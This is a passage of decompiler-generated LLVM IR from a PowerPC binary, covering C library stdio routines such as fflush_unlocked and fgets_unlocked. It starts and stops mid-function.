  store i32 %v2_100142bc, i32* @r3, align 4
  %v0_100142f8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100142f8, label %dec_label_pc_100142fc, label %dec_label_pc_10014300

dec_label_pc_100142fc:                            ; preds = %dec_label_pc_100142dc
  %v0_100142fc = call i32 @__pthread_return_void()
  %v0_10014304.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014300

dec_label_pc_10014300:                            ; preds = %dec_label_pc_100142dc, %dec_label_pc_100142fc
  %v0_10014304 = phi i32 [ %v4_100142e8, %dec_label_pc_100142dc ], [ %v0_10014304.pre, %dec_label_pc_100142fc ]
  %v1_10014314 = call %1 @__asm_mtcrf(i32 8, i32 %v0_10014294)
  %v9_10014314 = extractvalue %1 %v1_10014314, 7
  store i4 %v9_10014314, i4* @cr4, align 1
  ret i32 %v0_10014304

; uselistorder directives
  uselistorder i32 %v0_10014294, { 1, 0, 2 }
  uselistorder i32 52, { 1, 2, 3, 4, 5, 8, 6, 7, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10014300, { 1, 0 }
  uselistorder label %dec_label_pc_100142dc, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011758.1042 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1002c580.1040 to i32), i32* @r29, align 4
  %v2_10014344 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10014344, i32* @r3, align 4
  %v0_1001434c = call i32 @__pthread_return_void()
  %v0_10014354 = call i32 @__pthread_return_0()
  %v3_1001435c = load i32, i32* @global_var_1002c918.1159, align 4
  %v3_10014360 = icmp eq i32 %v3_1001435c, 1
  br i1 %v3_10014360, label %dec_label_pc_10014368, label %dec_label_pc_10014410

dec_label_pc_10014368:                            ; preds = %entry
  %v3_1001436c = load i16*, i16** @global_var_1002c91c.1160, align 4
  %v2_10014370 = icmp sgt i16* %v3_1001436c, null
  br i1 %v2_10014370, label %dec_label_pc_10014378, label %dec_label_pc_10014410

dec_label_pc_10014378:                            ; preds = %dec_label_pc_10014368
  %v2_10014384 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10014384, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_10014390 = call i32 @__pthread_return_void()
  %v0_10014398 = call i32 @__pthread_return_0()
  %storemerge7 = load i32, i32* bitcast (i32** @global_var_1002c8c8.1041 to i32*), align 4
  store i32 %storemerge7, i32* @r29, align 4
  %v3_100143f010 = icmp eq i32 %storemerge7, 0
  %v0_100143f411 = load i32, i32* @r30, align 4
  br i1 %v3_100143f010, label %dec_label_pc_100143fc, label %dec_label_pc_100143a8

dec_label_pc_100143a8:                            ; preds = %dec_label_pc_10014378, %dec_label_pc_100143f0.backedge
  %v0_100143f416 = phi i32 [ %v0_100143f4, %dec_label_pc_100143f0.backedge ], [ %v0_100143f411, %dec_label_pc_10014378 ]
  %v3_100143f417.in = phi i32 [ %v0_100143f4, %dec_label_pc_100143f0.backedge ], [ %v0_100143f411, %dec_label_pc_10014378 ]
  %storemerge15 = phi i32 [ %storemerge, %dec_label_pc_100143f0.backedge ], [ %storemerge7, %dec_label_pc_10014378 ]
  %v1_100143a8 = inttoptr i32 %storemerge15 to i16*
  %v2_100143a8 = load i16, i16* %v1_100143a8, align 2
  %v1_100143ac = add i32 %storemerge15, 32
  %v2_100143ac = inttoptr i32 %v1_100143ac to i32*
  %v3_100143ac = load i32, i32* %v2_100143ac, align 4
  store i32 %v3_100143ac, i32* @r31, align 4
  %v1_100143b0 = and i16 %v2_100143a8, -32720
  %v3_100143b4 = icmp eq i16 %v1_100143b0, 48
  br i1 %v3_100143b4, label %dec_label_pc_100143c4, label %dec_label_pc_100143bc

dec_label_pc_100143bc:                            ; preds = %dec_label_pc_100143a8
  store i32 %storemerge15, i32* @r30, align 4
  br label %dec_label_pc_100143f0.backedge

dec_label_pc_100143c4:                            ; preds = %dec_label_pc_100143a8
  %v3_100143f417 = icmp eq i32 %v3_100143f417.in, 0
  br i1 %v3_100143f417, label %dec_label_pc_100143c8, label %dec_label_pc_100143d4

dec_label_pc_100143c8:                            ; preds = %dec_label_pc_100143c4
  store i32 %v3_100143ac, i32* bitcast (i32** @global_var_1002c8c8.1041 to i32*), align 4
  br label %dec_label_pc_100143d8

dec_label_pc_100143d4:                            ; preds = %dec_label_pc_100143c4
  %v2_100143d4 = add i32 %v0_100143f416, 32
  %v3_100143d4 = inttoptr i32 %v2_100143d4 to i32*
  store i32 %v3_100143ac, i32* %v3_100143d4, align 4
  %v0_100143d8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100143d8

dec_label_pc_100143d8:                            ; preds = %dec_label_pc_100143c8, %dec_label_pc_100143d4
  %v0_100143d8 = phi i32 [ %storemerge15, %dec_label_pc_100143c8 ], [ %v0_100143d8.pre, %dec_label_pc_100143d4 ]
  %v1_100143d8 = inttoptr i32 %v0_100143d8 to i16*
  %v2_100143d8 = load i16, i16* %v1_100143d8, align 2
  %v1_100143e0 = and i16 %v2_100143d8, 8192
  %v3_100143e0 = icmp eq i16 %v1_100143e0, 0
  br i1 %v3_100143e0, label %dec_label_pc_100143f0.backedge, label %dec_label_pc_100143e8

dec_label_pc_100143f0.backedge:                   ; preds = %dec_label_pc_100143d8, %dec_label_pc_100143bc, %dec_label_pc_100143e8
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_100143f0 = icmp eq i32 %storemerge, 0
  %v0_100143f4 = load i32, i32* @r30, align 4
  br i1 %v3_100143f0, label %dec_label_pc_100143fc, label %dec_label_pc_100143a8

dec_label_pc_100143e8:                            ; preds = %dec_label_pc_100143d8
  store i32 268518380, i32* @lr, align 4
  %v2_100143e8 = call i32 @free(i32 %v0_100143d8)
  br label %dec_label_pc_100143f0.backedge

dec_label_pc_100143fc:                            ; preds = %dec_label_pc_100143f0.backedge, %dec_label_pc_10014378
  store i32 %v2_10014384, i32* @r3, align 4
  %v0_10014404 = call i32 @__pthread_return_void()
  %v0_1001440c = load i32, i32* @r29, align 4
  %v4_1001440c = inttoptr i32 %v0_1001440c to i16*
  store i16* %v4_1001440c, i16** @global_var_1002c91c.1160, align 4
  %v3_10014418.pre = load i32, i32* @global_var_1002c918.1159, align 4
  br label %dec_label_pc_10014410

dec_label_pc_10014410:                            ; preds = %dec_label_pc_10014368, %entry, %dec_label_pc_100143fc
  %v3_10014418 = phi i32 [ 1, %dec_label_pc_10014368 ], [ %v3_1001435c, %entry ], [ %v3_10014418.pre, %dec_label_pc_100143fc ]
  store i32 %v2_10014344, i32* @r3, align 4
  %v1_10014420 = add i32 %v3_10014418, -1
  store i32 %v1_10014420, i32* @global_var_1002c918.1159, align 4
  %v0_10014428 = call i32 @__pthread_return_void()
  ret i32 %v0_10014428

; uselistorder directives
  uselistorder i32 %v0_100143f4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_100143d8, { 1, 0 }
  uselistorder i32 %v3_100143ac, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 20, 19, 18, 17, 0 }
  uselistorder i16** @global_var_1002c91c.1160, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10014410, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100143f0.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100143d8, { 1, 0 }
  uselistorder label %dec_label_pc_100143a8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1002c8c8.1041 to i32), i32* %r9.global-to-local, align 4
  %v5_10014450 = icmp eq i16* %arg1, bitcast (i32** @global_var_1002c8c8.1041 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10014450, label %dec_label_pc_10014474, label %dec_label_pc_10014468

dec_label_pc_10014468:                            ; preds = %entry
  %v4_10014468 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10014468, label %dec_label_pc_10014474, label %dec_label_pc_100145a0

dec_label_pc_10014474:                            ; preds = %dec_label_pc_10014468, %entry
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011758.1042 to i32), i32* @r30, align 4
  %v2_10014480 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10014480, i32* @r3, align 4
  %v0_10014494 = call i32 @__pthread_return_void()
  %v0_1001449c = call i32 @__pthread_return_0()
  %v3_100144a4 = load i32, i32* @global_var_1002c918.1159, align 4
  store i32 %v2_10014480, i32* @r3, align 4
  %v1_100144b4 = add i32 %v3_100144a4, 1
  store i32 %v1_100144b4, i32* %r9.global-to-local, align 4
  store i32 %v1_100144b4, i32* @global_var_1002c918.1159, align 4
  %v0_100144c0 = call i32 @__pthread_return_void()
  store i32 %v2_10014480, i32* @r3, align 4
  %v0_100144d0 = call i32 @__pthread_return_void()
  %v0_100144d8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %v2_10014480, i32* @r3, align 4
  %v3_100144e4 = load i32, i32* bitcast (i32** @global_var_1002c8c8.1041 to i32*), align 4
  store i32 %v3_100144e4, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_100144f0 = call i32 @__pthread_return_void()
  %v0_10014590.pr = load i32, i32* @r31, align 4
  %v3_100145903 = icmp eq i32 %v0_10014590.pr, 0
  br i1 %v3_100145903, label %dec_label_pc_10014598, label %dec_label_pc_100144f8

dec_label_pc_100144f8:                            ; preds = %dec_label_pc_10014474, %dec_label_pc_1001458c
  %v0_10014514 = phi i32 [ %v3_1001458c, %dec_label_pc_1001458c ], [ %v0_10014590.pr, %dec_label_pc_10014474 ]
  %v1_100144f8 = inttoptr i32 %v0_10014514 to i16*
  %v2_100144f8 = load i16, i16* %v1_100144f8, align 2
  %v3_100144f8 = zext i16 %v2_100144f8 to i32
  %v1_100144fc = and i32 %v3_100144f8, 64
  store i32 %v1_100144fc, i32* %r9.global-to-local, align 4
  %v3_100144fc = icmp eq i32 %v1_100144fc, 0
  br i1 %v3_100144fc, label %dec_label_pc_1001458c, label %dec_label_pc_10014504

dec_label_pc_10014504:                            ; preds = %dec_label_pc_100144f8
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10014508 = load i32, i32* @global_var_1002c8cc.1164, align 4
  %v3_1001450c = icmp eq i32 %v3_10014508, 2
  br i1 %v3_1001450c, label %dec_label_pc_10014530, label %dec_label_pc_10014514

dec_label_pc_10014514:                            ; preds = %dec_label_pc_10014504
  store i32 %v2_10014480, i32* @r3, align 4
  %v0_10014524 = call i32 @__pthread_return_void()
  %v0_1001452c = call i32 @__pthread_return_0()
  %v0_10014530.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014530

dec_label_pc_10014530:                            ; preds = %dec_label_pc_10014504, %dec_label_pc_10014514
  %v0_10014544 = phi i32 [ %v0_10014514, %dec_label_pc_10014504 ], [ %v0_10014530.pre, %dec_label_pc_10014514 ]
  %v1_10014530 = inttoptr i32 %v0_10014544 to i16*
  %v2_10014530 = load i16, i16* %v1_10014530, align 2
  %v3_10014530 = zext i16 %v2_10014530 to i32
  %v0_10014534 = load i32, i32* @r27, align 4
  %v2_10014534 = or i32 %v0_10014534, %v3_10014530
  %v1_10014538 = and i32 %v2_10014534, 832
  %v1_1001453c = xor i32 %v1_10014538, 320
  store i32 %v1_1001453c, i32* %r9.global-to-local, align 4
  %v3_1001453c = icmp eq i32 %v1_1001453c, 0
  br i1 %v3_1001453c, label %dec_label_pc_10014544, label %dec_label_pc_10014570

dec_label_pc_10014544:                            ; preds = %dec_label_pc_10014530
  store i32 %v0_10014544, i32* @r3, align 4
  store i32 268518732, i32* @lr, align 4
  %v0_10014548 = call i32 @__stdio_wcommit()
  %v3_1001454c = icmp eq i32 %v0_10014548, 0
  br i1 %v3_1001454c, label %dec_label_pc_1001455c, label %dec_label_pc_10014554

dec_label_pc_10014554:                            ; preds = %dec_label_pc_10014544
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10014570

dec_label_pc_1001455c:                            ; preds = %dec_label_pc_10014544
  %v0_1001455c = load i32, i32* @r31, align 4
  %v1_1001455c = inttoptr i32 %v0_1001455c to i16*
  %v2_1001455c = load i16, i16* %v1_1001455c, align 2
  %v3_1001455c = zext i16 %v2_1001455c to i32
  %v1_10014560 = add i32 %v0_1001455c, 8
  %v2_10014560 = inttoptr i32 %v1_10014560 to i32*
  %v3_10014560 = load i32, i32* %v2_10014560, align 4
  store i32 %v3_10014560, i32* %r9.global-to-local, align 4
  %v1_10014564 = call i32 @__asm_rlwinm(i32 %v3_1001455c, i32 0, i32 26, i32 24)
  %v2_10014564 = trunc i32 %v1_10014564 to i16
  %v1_10014568 = load i32, i32* @r31, align 4
  %v2_10014568 = add i32 %v1_10014568, 28
  %v3_10014568 = inttoptr i32 %v2_10014568 to i32*
  store i32 %v3_10014560, i32* %v3_10014568, align 4
  %v3_1001456c = load i32, i32* @r31, align 4
  %v4_1001456c = inttoptr i32 %v3_1001456c to i16*
  store i16 %v2_10014564, i16* %v4_1001456c, align 2
  br label %dec_label_pc_10014570

dec_label_pc_10014570:                            ; preds = %dec_label_pc_10014530, %dec_label_pc_10014554, %dec_label_pc_1001455c
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10014574 = load i32, i32* @global_var_1002c8cc.1164, align 4
  %v3_10014578 = icmp eq i32 %v3_10014574, 2
  br i1 %v3_10014578, label %dec_label_pc_1001458c, label %dec_label_pc_10014580

dec_label_pc_10014580:                            ; preds = %dec_label_pc_10014570
  store i32 %v2_10014480, i32* @r3, align 4
  %v0_10014588 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1001458c

dec_label_pc_1001458c:                            ; preds = %dec_label_pc_10014570, %dec_label_pc_100144f8, %dec_label_pc_10014580
  %v0_1001458c = load i32, i32* @r31, align 4
  %v1_1001458c = add i32 %v0_1001458c, 32
  %v2_1001458c = inttoptr i32 %v1_1001458c to i32*
  %v3_1001458c = load i32, i32* %v2_1001458c, align 4
  store i32 %v3_1001458c, i32* @r31, align 4
  %v3_10014590 = icmp eq i32 %v3_1001458c, 0
  br i1 %v3_10014590, label %dec_label_pc_10014598, label %dec_label_pc_100144f8

dec_label_pc_10014598:                            ; preds = %dec_label_pc_1001458c, %dec_label_pc_10014474
  store i32 ptrtoint (i32* @global_var_1001459c.1167 to i32), i32* @lr, align 4
  %v0_10014598 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_100145d8

dec_label_pc_100145a0:                            ; preds = %dec_label_pc_10014468
  %v3_100145a0 = load i16, i16* %arg1, align 2
  %v4_100145a0 = zext i16 %v3_100145a0 to i32
  store i32 0, i32* @r28, align 4
  %v1_100145a8 = and i32 %v4_100145a0, 64
  store i32 %v1_100145a8, i32* %r9.global-to-local, align 4
  %v3_100145a8 = icmp eq i32 %v1_100145a8, 0
  br i1 %v3_100145a8, label %dec_label_pc_100145d8, label %dec_label_pc_100145b0

dec_label_pc_100145b0:                            ; preds = %dec_label_pc_100145a0
  store i32 268518836, i32* @lr, align 4
  %v0_100145b0 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_100145b8 = icmp eq i32 %v0_100145b0, 0
  br i1 %v3_100145b8, label %dec_label_pc_100145c0, label %dec_label_pc_100145d8

dec_label_pc_100145c0:                            ; preds = %dec_label_pc_100145b0
  %v0_100145c0 = load i32, i32* @r29, align 4
  %v1_100145c0 = inttoptr i32 %v0_100145c0 to i16*
  %v2_100145c0 = load i16, i16* %v1_100145c0, align 2
  %v3_100145c0 = zext i16 %v2_100145c0 to i32
  store i32 0, i32* @r28, align 4
  %v1_100145c8 = add i32 %v0_100145c0, 8
  %v2_100145c8 = inttoptr i32 %v1_100145c8 to i32*
  %v3_100145c8 = load i32, i32* %v2_100145c8, align 4
  store i32 %v3_100145c8, i32* %r9.global-to-local, align 4
  %v1_100145cc = call i32 @__asm_rlwinm(i32 %v3_100145c0, i32 0, i32 26, i32 24)
  %v2_100145cc = trunc i32 %v1_100145cc to i16
  %v3_100145d0 = load i32, i32* @r29, align 4
  %v4_100145d0 = inttoptr i32 %v3_100145d0 to i16*
  store i16 %v2_100145cc, i16* %v4_100145d0, align 2
  %v0_100145d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100145d4 = load i32, i32* @r29, align 4
  %v2_100145d4 = add i32 %v1_100145d4, 28
  %v3_100145d4 = inttoptr i32 %v2_100145d4 to i32*
  store i32 %v0_100145d4, i32* %v3_100145d4, align 4
  br label %dec_label_pc_100145d8

dec_label_pc_100145d8:                            ; preds = %dec_label_pc_100145b0, %dec_label_pc_100145a0, %dec_label_pc_10014598, %dec_label_pc_100145c0
  %v0_100145dc = load i32, i32* @r28, align 4
  ret i32 %v0_100145dc

; uselistorder directives
  uselistorder i32 %v3_1001458c, { 1, 2, 0 }
  uselistorder i32 %v1_1001453c, { 1, 0 }
  uselistorder i32 %v2_10014480, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1002c8c8.1041 to i32*), { 3, 4, 0, 5, 6, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10030000.1 to i32), { 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26, 9, 1, 27, 3, 2, 10, 4, 11, 28, 12, 29, 5, 13, 30, 31, 32, 33, 34, 14, 15, 7, 6, 8, 16 }
  uselistorder i32* @global_var_1002c918.1159, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__pthread_return_0, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 4, 3, 2, 23, 22, 21, 20, 6, 5, 0, 37, 39, 38, 36, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 18, 19, 1 }
  uselistorder i32 ()* @__pthread_return_void, { 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 5, 4, 3, 2, 1, 0, 45, 44, 49, 48, 47, 46, 43, 42, 7, 6, 9, 8 }
  uselistorder i32 268500992, { 7, 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_100145d8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001458c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014570, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014530, { 1, 0 }
  uselistorder label %dec_label_pc_100144f8, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10014698, label %dec_label_pc_10014610

dec_label_pc_10014610:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_100146783 = add i32 %arg2, -1
  store i32 %v2_100146783, i32* @r29, align 4
  %v4_100146809 = icmp eq i32 %arg2, 1
  br i1 %v4_100146809, label %dec_label_pc_10014684, label %dec_label_pc_10014618

dec_label_pc_10014618:                            ; preds = %dec_label_pc_10014610, %dec_label_pc_10014678.backedge
  %v2_10014634 = phi i32 [ %v2_1001463412, %dec_label_pc_10014678.backedge ], [ %tmp, %dec_label_pc_10014610 ]
  %v0_10014618 = phi i32 [ %v0_1001467c, %dec_label_pc_10014678.backedge ], [ %arg3, %dec_label_pc_10014610 ]
  %v1_10014618 = add i32 %v0_10014618, 16
  %v2_10014618 = inttoptr i32 %v1_10014618 to i32*
  %v3_10014618 = load i32, i32* %v2_10014618, align 4
  %v1_1001461c = add i32 %v0_10014618, 24
  %v2_1001461c = inttoptr i32 %v1_1001461c to i32*
  %v3_1001461c = load i32, i32* %v2_1001461c, align 4
  %v2_10014620 = add i32 %v3_10014618, 1
  store i32 %v2_10014620, i32* %r11.global-to-local, align 4
  %v3_10014624 = icmp ult i32 %v3_10014618, %v3_1001461c
  %v5_10014624 = icmp eq i32 %v3_10014618, %v3_1001461c
  store i1 %v5_10014624, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014624, label %dec_label_pc_1001462c, label %dec_label_pc_10014648

dec_label_pc_1001462c:                            ; preds = %dec_label_pc_10014618
  %v4_10014618 = inttoptr i32 %v3_10014618 to i8*
  %v3_1001462c = load i8, i8* %v4_10014618, align 1
  %v3_10014630 = icmp eq i8 %v3_1001462c, 10
  store i1 %v3_10014630, i1* %cr7_eq.global-to-local, align 1
  %v3_10014634 = inttoptr i32 %v2_10014634 to i8*
  store i8 %v3_1001462c, i8* %v3_10014634, align 1
  %v0_10014638 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014638 = load i32, i32* @r30, align 4
  %v2_10014638 = add i32 %v1_10014638, 16
  %v3_10014638 = inttoptr i32 %v2_10014638 to i32*
  store i32 %v0_10014638, i32* %v3_10014638, align 4
  %v0_1001463c = load i32, i32* @r31, align 4
  %v1_1001463c = add i32 %v0_1001463c, 1
  store i32 %v1_1001463c, i32* @r31, align 4
  %v0_10014640 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10014640, label %dec_label_pc_10014684, label %dec_label_pc_10014678.backedge

dec_label_pc_10014648:                            ; preds = %dec_label_pc_10014618
  %v1_1001467c10 = inttoptr i32 %v0_10014618 to i16*
  store i32 268518988, i32* @lr, align 4
  %v5_10014648 = call i32 @getc_unlocked(i16* %v1_1001467c10, i32 %v3_10014618)
  %v6_10014648 = trunc i32 %v5_10014648 to i8
  %v4_1001464c = icmp eq i8 %v6_10014648, -1
  store i1 %v4_1001464c, i1* %cr7_eq.global-to-local, align 1
  %v3_10014654 = icmp eq i8 %v6_10014648, 10
  store i1 %v3_10014654, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1001464c, label %dec_label_pc_1001465c, label %dec_label_pc_1001466c

dec_label_pc_1001465c:                            ; preds = %dec_label_pc_10014648
  %v0_1001465c = load i32, i32* @r30, align 4
  %v1_1001465c = inttoptr i32 %v0_1001465c to i16*
  %v2_1001465c = load i16, i16* %v1_1001465c, align 2
  %v1_10014660 = and i16 %v2_1001465c, 8
  %v3_10014660 = icmp eq i16 %v1_10014660, 0
  br i1 %v3_10014660, label %dec_label_pc_1001465c.dec_label_pc_10014684_crit_edge, label %dec_label_pc_10014698

dec_label_pc_1001465c.dec_label_pc_10014684_crit_edge: ; preds = %dec_label_pc_1001465c
  %v0_10014684.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014684

dec_label_pc_1001466c:                            ; preds = %dec_label_pc_10014648
  %v3_1001466c = load i32, i32* @r31, align 4
  %v4_1001466c = inttoptr i32 %v3_1001466c to i8*
  store i8 %v6_10014648, i8* %v4_1001466c, align 1
  %v0_10014670 = load i32, i32* @r31, align 4
  %v1_10014670 = add i32 %v0_10014670, 1
  store i32 %v1_10014670, i32* @r31, align 4
  %v0_10014674 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10014674, label %dec_label_pc_10014684, label %dec_label_pc_10014678.backedge

dec_label_pc_10014678.backedge:                   ; preds = %dec_label_pc_1001466c, %dec_label_pc_1001462c
  %v2_1001463412 = phi i32 [ %v1_10014670, %dec_label_pc_1001466c ], [ %v1_1001463c, %dec_label_pc_1001462c ]
  %v0_10014678 = load i32, i32* @r29, align 4
  %v2_10014678 = add i32 %v0_10014678, -1
  store i32 %v2_10014678, i32* @r29, align 4
  %v0_1001467c = load i32, i32* @r30, align 4
  %v4_10014680 = icmp eq i32 %v0_10014678, 1
  br i1 %v4_10014680, label %dec_label_pc_10014684, label %dec_label_pc_10014618

dec_label_pc_10014684:                            ; preds = %dec_label_pc_1001466c, %dec_label_pc_10014678.backedge, %dec_label_pc_1001462c, %dec_label_pc_10014610, %dec_label_pc_1001465c.dec_label_pc_10014684_crit_edge
  %v2_10014690 = phi i32 [ %v0_10014684.pre, %dec_label_pc_1001465c.dec_label_pc_10014684_crit_edge ], [ %tmp, %dec_label_pc_10014610 ], [ %v1_1001463c, %dec_label_pc_1001462c ], [ %v2_1001463412, %dec_label_pc_10014678.backedge ], [ %v1_10014670, %dec_label_pc_1001466c ]
  %v1_10014684 = load i32, i32* @r28, align 4
  %v3_10014684 = icmp ugt i32 %v2_10014690, %v1_10014684
  %v4_10014684 = icmp eq i32 %v2_10014690, %v1_10014684
  store i1 %v4_10014684, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014684, label %dec_label_pc_1001468c, label %dec_label_pc_10014698

dec_label_pc_1001468c:                            ; preds = %dec_label_pc_10014684
  %v3_10014690 = inttoptr i32 %v2_10014690 to i8*
  store i8 0, i8* %v3_10014690, align 1
  %v0_100146a0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001469c

dec_label_pc_10014698:                            ; preds = %dec_label_pc_1001465c, %dec_label_pc_10014684, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001469c

dec_label_pc_1001469c:                            ; preds = %dec_label_pc_1001468c, %dec_label_pc_10014698
  %v0_100146a0 = phi i32 [ %v0_100146a0.pre, %dec_label_pc_1001468c ], [ 0, %dec_label_pc_10014698 ]
  ret i32 %v0_100146a0

; uselistorder directives
  uselistorder i32 %v2_10014690, { 0, 2, 1 }
  uselistorder i8 %v6_10014648, { 1, 0, 2 }
  uselistorder i32 %v3_1001461c, { 1, 0 }
  uselistorder i32 %v3_10014618, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10014618, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8 10, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001469c, { 1, 0 }
  uselistorder label %dec_label_pc_10014698, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014684, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10014618, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_100146b4 = urem i32 %arg1, 256
  store i32 %v1_100146b4, i32* %r4.global-to-local, align 4
  %v0_100146cc1 = load i32, i32* @r3, align 4
  %v1_100146cc2 = urem i32 %v0_100146cc1, 4
  %v3_100146cc4 = icmp eq i32 %v1_100146cc2, 0
  br i1 %v3_100146cc4, label %dec_label_pc_100146d4, label %dec_label_pc_100146bc

dec_label_pc_100146bc:                            ; preds = %entry, %dec_label_pc_100146bc
  %v1_100146c0 = phi i32 [ %v0_100146d4.pre, %dec_label_pc_100146bc ], [ %v1_100146b4, %entry ]
  %v0_100146bc = phi i32 [ %v1_100146c8, %dec_label_pc_100146bc ], [ %v0_100146cc1, %entry ]
  %v1_100146bc = inttoptr i32 %v0_100146bc to i8*
  %v2_100146bc = load i8, i8* %v1_100146bc, align 1
  %v3_100146bc = zext i8 %v2_100146bc to i32
  %v4_100146c0 = icmp eq i32 %v3_100146bc, %v1_100146c0
  %v0_100146c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100146c0, i32 %v0_100146c4)
  %v0_100146c8 = load i32, i32* @r3, align 4
  %v1_100146c8 = add i32 %v0_100146c8, 1
  store i32 %v1_100146c8, i32* @r3, align 4
  %v1_100146cc = urem i32 %v1_100146c8, 4
  %v3_100146cc = icmp eq i32 %v1_100146cc, 0
  %v0_100146d4.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_100146cc, label %dec_label_pc_100146d4, label %dec_label_pc_100146bc

dec_label_pc_100146d4:                            ; preds = %dec_label_pc_100146bc, %entry
  %v0_100146ec9 = phi i32 [ %v0_100146cc1, %entry ], [ %v1_100146c8, %dec_label_pc_100146bc ]
  %v0_100146d4 = phi i32 [ %v1_100146b4, %entry ], [ %v0_100146d4.pre, %dec_label_pc_100146bc ]
  %v1_100146d4 = mul i32 %v0_100146d4, 256
  %v2_100146dc = or i32 %v1_100146d4, %v0_100146d4
  %v1_100146e4 = mul i32 %v2_100146dc, 65536
  %v2_100146e8 = or i32 %v1_100146e4, %v2_100146dc
  br label %dec_label_pc_100146ec

dec_label_pc_100146ec:                            ; preds = %dec_label_pc_10014758, %dec_label_pc_100146ec, %dec_label_pc_100146d4
